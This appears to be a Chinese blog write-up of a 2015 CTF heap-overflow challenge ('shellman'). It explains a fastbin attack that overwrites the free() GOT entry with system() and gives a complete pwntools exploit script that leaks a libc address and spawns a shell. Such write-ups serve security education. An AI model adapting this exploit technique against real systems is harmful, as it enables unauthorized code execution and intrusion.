---
title: 【CTF】shellman堆溢出
date: 2017-12-21 21:24:10
categories: CTF
tags:
    - 堆溢出
    - fastbin
---

题目来自于2015年强网杯的一道二进制题目shellman, 程序流程很清晰，阅读ida逆向后的代码很容易发现在编辑shellcode时存在溢出，一道很明显的堆溢出二进制漏洞，至于怎么利用，初始想的是利用fastbin attackg攻击，改掉shellcode管理中记录分配的地址，再利用edit功能，修改给出的函数的got地址，改为shellcode地址，后来发现开启的堆栈保护，不能利用，由于堆内容是可控的，结合delete功能，修改free函数的got地址为system地址，system执行堆上的命令，具体细节网上也很多，可参考后文链接，只是网上的都是基于堆溢出+unlink的攻击方式，这里给出堆溢出加fastbin attack的攻击方法, 详情见POC.

<!-- more-->
* POC

```Python
# -*- coding: utf-8 -*-

from pwn import *

context.arch='amd64'
context.os='linux'
context.word_size = 64
context.log_level = 'debug'

io = process('./shellman')

stack_addr = 0x6016C0 + 8*3*2
free_got_addr = 0x601600
system_offset_free = -258400    # ubuntu16.04 glibc 2.2.5

def new_code(code):
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil(': ')
    io.sendline(str(len(code)))
    io.recvuntil(': ')
    io.send(code)

def delete_code(idx):
    io.recvuntil('> ')
    io.sendline('4')
    io.recvuntil(': ')
    io.sendline(str(idx))

def edit_code(idx, code):
    io.recvuntil('> ')
    io.sendline('3')
    io.recvuntil(': ')
    io.sendline(str(idx))
    io.recvuntil(': ')
    io.sendline(str(len(code)))
    io.recvuntil(': ')
    io.send(code)

def list_code():
    io.recvuntil('> ')
    io.sendline('1')

new_code('A'*32)
new_code('A'*16)
new_code('A'*32)
delete_code(1)

overflow = 'A'*32 + p64(1)+p64(33)+p64(stack_addr)
edit_code(0, overflow)
new_code('/bin/sh\x00')

new_code(p64(free_got_addr))
list_code()

io.recvuntil('SHELLC0DE 2: ')
free_addr = io.recvline().strip()[:16]
addrs = []
for i in range(0, len(free_addr), 2):
    addrs.append(free_addr[i:i+2])
addrs.reverse()
free_addr = ''.join(addrs)
print 'leak libc free addr: ' + free_addr

system_addr = int(free_addr, 16) + system_offset_free

edit_code(2, p64(system_addr))
delete_code(1)
io.interactive()
```

## REF

1. [伪造堆块绕过unlink检查 ctf-QiangWangCup-2015-shellman ](http://www.cnblogs.com/shangye/p/6261606.html)
2. [linux堆溢出实例分析](http://tyrande000.how/2016/03/21/linux%E5%A0%86%E6%BA%A2%E5%87%BA%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/)